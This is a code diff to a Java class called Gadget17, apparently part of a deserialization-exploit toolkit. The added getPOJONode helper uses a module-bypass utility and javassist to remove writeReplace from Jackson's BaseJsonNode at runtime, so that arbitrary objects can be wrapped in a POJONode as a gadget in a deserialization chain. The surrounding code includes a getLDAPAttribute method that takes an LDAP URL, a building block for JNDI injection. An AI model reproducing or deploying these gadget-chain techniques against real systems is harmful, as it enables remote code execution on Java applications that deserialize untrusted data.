@@ -3,6 +3,10 @@ package cn.org.unk;
 import cn.org.unk.test.TestGetter;
 import cn.org.unk.test.TestToString;
 import com.alibaba.fastjson.JSONArray;
+import com.fasterxml.jackson.databind.node.POJONode;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
 import org.springframework.aop.framework.AdvisedSupport;
 import sun.reflect.ReflectionFactory;
 
@@ -52,6 +56,23 @@ public class Gadget17 {
         return map3;
     }
 
+    public static POJONode getPOJONode(Object val){
+        try {
+
+            // SecurityActions 里面有一个 setAccessible 操作
+            UnsafeTools.bypassModule(Class.forName("javassist.util.proxy.SecurityActions"));
+
+            ClassPool pool = ClassPool.getDefault();
+            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
+            jsonNode.removeMethod(writeReplace);
+            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            jsonNode.toClass(classLoader, null);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return new POJONode(val);
+    }
 
     public static Object getLDAPAttribute(String ldapUrl) throws Exception{
         Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
